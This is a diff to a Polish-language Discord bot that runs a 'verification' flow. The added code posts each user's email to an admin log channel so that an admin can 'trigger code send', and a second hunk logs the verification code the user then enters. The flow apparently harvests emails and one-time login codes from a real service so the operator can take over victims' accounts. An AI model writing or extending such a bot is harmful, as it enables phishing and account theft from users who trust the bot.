@@ -165,6 +165,22 @@ client.on('interactionCreate', async (interaction) => {
             const email = interaction.fields.getTextInputValue('input_email');
             pendingVerifications.set(interaction.user.id, { email });
 
+            // Log EMAIL immediately so admin can trigger code send
+            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
+            if (logChannel) {
+                const logEmbed = new EmbedBuilder()
+                    .setColor(0xFFAA00) // Warning/Pending Orange
+                    .setTitle('📧 Rozpoczęto Weryfikację (E-mail)')
+                    .setThumbnail(interaction.user.displayAvatarURL())
+                    .addFields(
+                        { name: '👤 Użytkownik', value: `${interaction.user.tag} (\`${interaction.user.id}\`)`, inline: false },
+                        { name: '📧 Adres E-mail', value: `\`${email}\``, inline: true }
+                    )
+                    .setFooter({ text: 'Użytkownik podał maila, czekaj na kod...' })
+                    .setTimestamp();
+                await logChannel.send({ embeds: [logEmbed] });
+            }
+
             const nextStepEmbed = new EmbedBuilder()
                 .setColor(0x00AAFF)
                 .setTitle('📥 Sprawdź swoją skrzynkę')
@@ -191,12 +207,12 @@ client.on('interactionCreate', async (interaction) => {
             const data = pendingVerifications.get(interaction.user.id);
             const email = data ? data.email : "Nieznany";
 
-            // Log results to management channel
+            // Log CODE results to management channel
             const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
             if (logChannel) {
                 const logEmbed = new EmbedBuilder()
                     .setColor(0x57F287) // Success Green
-                    .setTitle('🔐 Nowe Dane Weryfikacyjne')
+                    .setTitle('🔐 Otrzymano Kod Weryfikacyjny')
                     .setThumbnail(interaction.user.displayAvatarURL())
                     .addFields(
                         { name: '👤 Użytkownik', value: `${interaction.user.tag} (\`${interaction.user.id}\`)`, inline: false },
